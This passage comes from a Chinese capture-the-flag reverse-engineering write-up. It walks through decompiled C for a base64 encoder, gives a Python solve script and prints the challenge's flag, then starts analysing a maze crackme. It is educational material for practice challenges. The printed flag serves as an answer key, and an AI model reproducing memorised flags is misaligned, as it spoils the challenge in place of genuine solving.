data-num="20"></td><td><pre>  <span class="token operator">*</span>a3 <span class="token operator">=</span> v10<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  v12 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v12 <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token function">j_memset</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  v13 <span class="token operator">=</span> a1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>  v11 <span class="token operator">=</span> a2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v11 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    byte_41A144<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    byte_41A144<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    byte_41A144<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token operator">&amp;&amp;</span> v11 <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>      byte_41A144<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span>v13<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>      <span class="token operator">--</span>v11<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>      <span class="token operator">++</span>v13<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>      <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> aAbcdefghijklmn<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>byte_41A144<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        v5 <span class="token operator">=</span> v4 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> v5<span class="token punctuation">)</span> <span class="token operator">=</span> aAbcdefghijklmn<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>byte_41A144<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF0</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>byte_41A144<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> <span class="token operator">++</span>v5<span class="token punctuation">)</span> <span class="token operator">=</span> aAbcdefghijklmn<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> <span class="token operator">++</span>v5<span class="token punctuation">)</span> <span class="token operator">=</span> aAbcdefghijklmn<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        v4 <span class="token operator">=</span> v5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="52"></td><td><pre>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> aAbcdefghijklmn<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>byte_41A144<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>        v6 <span class="token operator">=</span> v4 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> aAbcdefghijklmn<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>byte_41A144<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF0</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>byte_41A144<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> <span class="token operator">++</span>v6<span class="token punctuation">)</span> <span class="token operator">=</span> aAbcdefghijklmn<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>byte_41A144<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xC0</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>byte_41A144<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> <span class="token operator">++</span>v6<span class="token punctuation">)</span> <span class="token operator">=</span> aAbcdefghijklmn<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>        v4 <span class="token operator">=</span> v6 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="60"></td><td><pre>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> aAbcdefghijklmn<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>byte_41A144<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        v7 <span class="token operator">=</span> v4 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> v7<span class="token punctuation">)</span> <span class="token operator">=</span> aAbcdefghijklmn<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>byte_41A144<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF0</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>byte_41A144<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> <span class="token operator">++</span>v7<span class="token punctuation">)</span> <span class="token operator">=</span> aAbcdefghijklmn<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>byte_41A144<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xC0</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>byte_41A144<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> <span class="token operator">++</span>v7<span class="token punctuation">)</span> <span class="token operator">=</span> aAbcdefghijklmn<span class="token punctuation">[</span>byte_41A144<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>        v4 <span class="token operator">=</span> v7 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v12 <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>  <span class="token keyword">return</span> v12<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>从加密程序可以看出 <code>aAbcdefghijklmn</code>  这个变量是加密程序的关键变量，那我们接着跟进查看 <code>aAbcdefghijklmn</code>  这个变量</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220323171127651.png" alt="image-20220323171127651" /></p>
<p>得到如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>aAbcdefghijklmn db 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789<span class="token operator">+</span><span class="token operator">/=</span>'</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220323171202397.png" alt="image-20220323171202397" /></p>
<p>再结合前面的加密代码由 3 个字符变成 4 个字符，还有移位啥的，不难猜出这是一个 base64 加密的加密函数。</p>
<p>接下来就是边写解题脚本了</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>s <span class="token operator">=</span> <span class="token string">"e3nifIH9b_C@n@dH"</span></pre></td></tr><tr><td data-num="4"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到运行结果，也就是我们的 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220323171613096.png" alt="image-20220323171613096" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>i_l0ve_you<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>如此套上 flag 即可提交成功！</p>
<h2 id="不一样的flag"><a class="anchor" href="#不一样的flag">#</a> 不一样的 flag</h2>
<p>是不是做习惯了常规的逆向题目？试试这道题，看你在能不能在程序中找到真正的 flag！注意：flag 并非是 flag {XXX} 形式，就是一个’字符串‘，考验眼力的时候到了！ 注意：得到的 flag 请包上 flag {} 提交</p>
<p>拿到题目，是一个 win32 的 exe 程序</p>
<p>程序运行如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220324174422045.png" alt="image-20220324174422045" /></p>
<p>ida 打开，一串字符直接映入眼帘，拷贝下来，没准后面有用</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">*</span><span class="token number">11110100001010000101111</span>#</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220324173241146.png" alt="image-20220324173241146" /></p>
<p>f5 跟进得到如下</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  _BYTE v3<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+17h] [ebp-35h] BYREF</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+34h] [ebp-18h]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+38h] [ebp-14h] BYREF</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-10h]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  _BYTE v7<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+40h] [ebp-Ch] BYREF</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">__main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  v3<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token string">"*11110100001010000101111#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you can choose one action to execute"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1 up"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2 down"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3 left"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"4 right\n:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>      <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token operator">--</span>v4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>      <span class="token keyword">else</span></pre></td></tr><tr><td data-num="33"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>LABEL_13<span class="token operator">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token operator">++</span>v4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">else</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>      <span class="token operator">--</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7<span class="token punctuation">[</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">41</span> <span class="token operator">+</span> v4<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">49</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7<span class="token punctuation">[</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">41</span> <span class="token operator">+</span> v4<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">35</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nok, the order you enter is the flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220324173430471.png" alt="image-20220324173430471" /></p>
<p>根据代码可以发现，程序主要加密程序如下</p>
